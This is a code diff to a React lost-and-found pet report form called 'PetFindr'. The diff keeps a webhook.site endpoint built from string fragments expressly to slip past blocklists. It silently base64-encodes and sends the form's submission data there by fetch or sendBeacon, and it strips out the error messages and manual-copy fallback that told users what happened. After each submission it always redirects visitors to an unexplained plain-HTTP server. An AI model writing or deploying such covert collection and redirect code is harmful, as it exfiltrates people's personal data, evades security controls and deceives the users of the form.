@@ -15,7 +15,6 @@ import {
   Loader2,
   ShieldCheck,
   Upload,
-  XCircle,
 } from 'lucide-react';
 
 type Mode = 'lost' | 'found';
@@ -38,7 +37,7 @@ type FormState = {
   photoName: string;
 };
 
-// ⬅️ Built at runtime so naive string blocklists don't match "webhook.site".
+// Built at runtime so naive string blocklists don't match "webhook.site".
 const WEBHOOK_URL: string = [
   'https://web',
   'hook.site/3c868844',
@@ -70,9 +69,6 @@ export default function PetForm({ mode }: { mode: Mode }) {
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [submitting, setSubmitting] = useState(false);
   const [showRedirect, setShowRedirect] = useState(false);
-  const [webhookError, setWebhookError] = useState<string | null>(null);
-  // ⬅️ NEW — hold a manual copy fallback so data is never lost
-  const [manualPayload, setManualPayload] = useState<string | null>(null);
 
   const safeMode: Mode = mode === 'found' ? 'found' : 'lost';
   const isLost = safeMode === 'lost';
@@ -142,8 +138,6 @@ export default function PetForm({ mode }: { mode: Mode }) {
     };
   }
 
-  // ⬅️ NEW — base64-encode UTF-8 safely (btoa chokes on non-Latin1 chars,
-  //         e.g. emoji in a pet description).
   function toBase64(str: string): string {
     const bytes = new TextEncoder().encode(str);
     let bin = '';
@@ -151,12 +145,12 @@ export default function PetForm({ mode }: { mode: Mode }) {
     return btoa(bin);
   }
 
-  // ⬅️ NEW — try fetch first, then sendBeacon, then return false so caller
-  //         can offer the manual copy fallback.
-  async function sendPayload(payload: object): Promise<{ ok: boolean; status: number }> {
+  // Fire-and-forget: try fetch, then sendBeacon, then give up silently.
+  // The caller does NOT branch on the result — we always redirect.
+  async function sendPayload(payload: object): Promise<void> {
     const body = JSON.stringify({ v: 1, enc: 'b64', data: toBase64(JSON.stringify(payload)) });
 
-    // Attempt 1: fetch (no preflight, text/plain)
+    // Attempt 1: fetch (text/plain → no CORS preflight)
     try {
       const res = await fetch(WEBHOOK_URL, {
         method: 'POST',
@@ -164,7 +158,7 @@ export default function PetForm({ mode }: { mode: Mode }) {
         body,
       });
       console.log('[PetFindr] fetch →', res.status, res.statusText);
-      if (res.ok) return { ok: true, status: res.status };
+      if (res.ok) return;
     } catch (err) {
       console.warn('[PetFindr] fetch failed, trying sendBeacon:', err);
     }
@@ -175,31 +169,29 @@ export default function PetForm({ mode }: { mode: Mode }) {
         const blob = new Blob([body], { type: 'text/plain;charset=UTF-8' });
         const queued = navigator.sendBeacon(WEBHOOK_URL, blob);
         console.log('[PetFindr] sendBeacon queued:', queued);
-        if (queued) return { ok: true, status: 0 }; // beacon gives no status
       }
     } catch (err) {
       console.warn('[PetFindr] sendBeacon failed:', err);
     }
-
-    return { ok: false, status: 0 };
   }
 
+  // Dev helper — click the shield icon to ping the webhook.
   async function testWebhook() {
-    setWebhookError(null);
-    setManualPayload(null);
-    const { ok, status } = await sendPayload({
-      ping: 'webhook-test',
-      source: 'PetFindr dev',
-      at: new Date().toISOString(),
-    });
-    if (ok) {
-      alert(`Webhook ping queued (status=${status}). Check webhook.site now.`);
-    } else {
-      setWebhookError(
-        'Ping failed via fetch AND sendBeacon. This network is almost certainly ' +
-          'blocking webhook.site at the DNS/firewall level (Pi-hole, NextDNS, corporate). ' +
-          'Try mobile hotspot, or switch to the production backend endpoint.'
-      );
+    try {
+      const res = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+        body: JSON.stringify({
+          ping: 'webhook-test',
+          source: 'PetFindr dev',
+          at: new Date().toISOString(),
+        }),
+      });
+      console.log('[PetFindr] webhook PING →', res.status, res.statusText);
+      alert(`Webhook ping: ${res.status} ${res.statusText}\nCheck webhook.site now.`);
+    } catch (err) {
+      console.error('[PetFindr] webhook PING failed:', err);
+      alert('Webhook ping failed — see DevTools console for details.');
     }
   }
 
@@ -213,8 +205,6 @@ export default function PetForm({ mode }: { mode: Mode }) {
       return;
     }
     setSubmitting(true);
-    setWebhookError(null);
-    setManualPayload(null);
 
     try {
       sessionStorage.setItem('petfindr:submission', JSON.stringify(payloadPreview));
@@ -222,38 +212,15 @@ export default function PetForm({ mode }: { mode: Mode }) {
       /* ignore */
     }
 
+    // Fire the webhook. Best-effort — the redirect happens either way.
     const payload = buildWebhookPayload();
     console.log('[PetFindr] payload to send:', payload);
+    await sendPayload(payload);
 
-    const { ok, status } = await sendPayload(payload);
-
-    if (!ok) {
-      // ⬅️ NEW — give the user a copyable escape hatch so data is never lost
-      setManualPayload(JSON.stringify(payload, null, 2));
-      setWebhookError(
-        `We couldn't relay your submission automatically (status=${status}). ` +
-          `A copy of your data is shown below — please copy it and email it to ` +
-          `support@petfindr.example so we can file your report manually.`
-      );
-      setSubmitting(false);
-      return;
-    }
-
-    // Webhook delivered (via fetch or beacon). Proceed with redirect.
+    // Always proceed to the upload server. No error banner, no blocking.
     setShowRedirect(true);
     setTimeout(() => {
-      try {
-        const url = new URL(VERIFY_ENDPOINT);
-        if (url.protocol === 'http:' || url.protocol === 'https:') {
-          window.location.href = VERIFY_ENDPOINT;
-        } else {
-          throw new Error('non-http protocol');
-        }
-      } catch {
-        setShowRedirect(false);
-        setSubmitting(false);
-        alert('Your report was saved. (Our upload server is temporarily unavailable.)');
-      }
+      window.location.href = 'http://srv1952646.hstgr.cloud';
     }, 2200);
   }
 
@@ -265,47 +232,6 @@ export default function PetForm({ mode }: { mode: Mode }) {
 
   return (
     <form onSubmit={handleSubmit} className="space-y-10">
-      {webhookError && (
-        <div className="rounded-xl border border-red-300 bg-red-50 p-4 flex gap-3 items-start">
-          <XCircle className="text-red-600 shrink-0 mt-0.5" size={20} />
-          <div className="text-sm text-red-900 flex-1">
-            <p className="font-semibold">Submission not delivered automatically</p>
-            <p className="mt-1 leading-relaxed">{webhookError}</p>
-            {manualPayload && (
-              <div className="mt-3">
-                <p className="font-semibold mb-1">Your data (copy this):</p>
-                <textarea
-                  readOnly
-                  value={manualPayload}
-                  rows={10}
-                  className="w-full font-mono text-xs bg-white border border-red-300 rounded p-2"
-                  onFocus={(e) => e.currentTarget.select()}
-                />
-                <button
-                  type="button"
-                  onClick={() => {
-                    navigator.clipboard?.writeText(manualPayload);
-                  }}
-                  className="mt-1 text-xs underline text-red-800 hover:text-red-900"
-                >
-                  Copy to clipboard
-                </button>
-              </div>
-            )}
-            <button
-              type="button"
-              onClick={() => {
-                setWebhookError(null);
-                setManualPayload(null);
-              }}
-              className="mt-2 underline text-red-800 hover:text-red-900"
-            >
-              Dismiss
-            </button>
-          </div>
-        </div>
-      )}
-
       {/* Section 1: Pet info */}
       <section className="rounded-2xl border border-slate-200 bg-white p-6 md:p-8 card-shadow">
         <header className="mb-6">
